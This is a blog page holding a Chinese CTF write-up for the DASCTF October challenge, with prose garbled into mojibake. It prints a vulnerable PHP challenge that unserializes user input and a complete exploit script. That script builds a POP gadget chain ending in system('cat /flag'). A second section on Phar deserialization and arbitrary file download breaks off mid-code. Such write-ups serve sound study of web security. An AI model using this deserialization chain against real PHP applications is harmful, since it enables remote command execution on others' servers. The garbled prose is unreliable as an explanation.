<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DASCTF åæœˆæŒ‘æˆ˜èµ› - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DASCTF åæœˆæŒ‘æˆ˜èµ› - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:31:40.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">DASCTF åæœˆæŒ‘æˆ˜èµ›</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ„Ÿè§‰è¿˜æ˜¯å­¦äº†æŒºå¤šä¸œè¥¿çš„ï¼ŒDASCTFçš„é¢˜éƒ½è®©æˆ‘çœ¼å‰ä¸€äº®ï¼Œå­¦çš„å¾ˆæœ‰åŠ²ï¼Œä¹Ÿè®¤è¯†åˆ°äº†è‡ªå·±çš„èœé¸¡å‘œå‘œå‘œ</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line">Ctfer: Duration of practice: Two <span class="keyword">and</span> a half years</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜¯è¯´ç®€å•çš„PHPï¼Œå½“æ—¶å†™çš„æ—¶å€™ç»•æ­»æˆ‘äº†è‰ï¼<br>pop:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="variable">$file</span>,<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="variable">$file</span>,<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&#x27;a&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>popè§¦å‘é“¾ä¸º<code>sorry::__destruct=&gt;show::__toString=&gt;secret_code::show()=&gt;sorry::__get=&gt;fine::__invoke()</code><br>ç®€å•æ˜“æ‡‚ï¼Œä¸€ç‚¹ä¸å«ç³Š</p>
<h2 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h2><p>DASCTFçš„é¢˜çœŸèƒ½è®©æˆ‘æ„Ÿåˆ°æ¾æ¹ƒå•Š<br>æˆ‘æ„Ÿè§‰æœ€æ¥è¿‘ç­”æ¡ˆçš„ä¸€æ¬¡<br>è€ƒç‚¹ï¼šåˆ©ç”¨æŒ‡é’ˆç»•è¿‡__wakeupï¼ŒPharååºåˆ—åŒ–ï¼Œé€šé…ç¬¦ï¼Œä»»æ„æ–‡ä»¶ä¸‹è½½<br>å¼€å§‹å®¡é¢˜ï¼š<br>è¿›å…¥ä¹‹åè¾“å…¥ç”¨æˆ·åï¼Œç„¶åæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900725011-457a69fb-ccc7-48a2-a848-af36aa8af405.png#averageHue=%23fcfcfc&clientId=u43d448bb-efee-4&from=paste&height=150&id=u100864df&name=image.png&originHeight=187&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9728&status=done&style=none&taskId=uca641524-d87a-4b35-9cdd-47c61c8d7c2&title=&width=824.8" alt="image.png"><br>ç¬¬ä¸€ä¸ªå¯¹åº”æ–‡ä»¶ä¸Šä¼ ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900732295-bc135acf-93c2-493a-bc37-5c3dbb47b685.png#averageHue=%23fdfdfd&clientId=u43d448bb-efee-4&from=paste&height=146&id=uf721ff45&name=image.png&originHeight=182&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4945&status=done&style=none&taskId=u2604770b-e641-4200-9bea-35c01214b5a&title=&width=659.2" alt="image.png"><br>ä¸Šä¼ æˆåŠŸåè¿”å›è·¯å¾„ï¼š<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900755117-5af9a168-8ed0-4aa3-b8d7-c50b416d0ce2.png#averageHue=%23f9f8f7&clientId=u43d448bb-efee-4&from=paste&height=86&id=u29e0471f&name=image.png&originHeight=108&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6310&status=done&style=none&taskId=u12119a60-c596-4185-a8c0-c9c3f2c7e3c&title=&width=747.2" alt="image.png"><br>ç¬¬äºŒä¸ªå¯¹åº”åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900767211-0b7d181a-b6ee-4a44-83f0-59a1b6f20259.png#averageHue=%23fdfdfc&clientId=u43d448bb-efee-4&from=paste&height=130&id=ud8fcbc89&name=image.png&originHeight=162&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3164&status=done&style=none&taskId=u45b39997-e546-45bd-adf2-b9a8336cd66&title=&width=411.2" alt="image.png"><br>ç¬¬ä¸‰ä¸ªå°±æ˜¯é‡ç‚¹äº†ï¼Œä»–æ˜¯ä¸€ä¸ªæŸ¥æ‰¾å›¾ç‰‡çš„åŠŸèƒ½ï¼Œè¿™è¾¹å°±å¾—è”æƒ³åˆ°æˆ‘ä»¬çš„ä»»æ„æ–‡ä»¶ä¸‹è½½äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900791214-b51161d6-6ca2-4fdc-a26e-1d1a9025e918.png#averageHue=%23fefefe&clientId=u43d448bb-efee-4&from=paste&height=426&id=u6ff523b9&name=image.png&originHeight=532&originWidth=1519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17873&status=done&style=none&taskId=ua4ef1cf1-399d-4b86-8733-a8b7031435b&title=&width=1215.2" alt="image.png"><br>å‡å¦‚æˆ‘ä»¬è¾“å…¥ï¼š<code>file.php</code><br>æºç ä¸­çš„imgçš„æ•°æ®å°±ä¼šæ”¹å˜(base64)ï¼Œè¿™è¾¹ç›´æ¥è§£ç å¾—åˆ°file.phpçš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 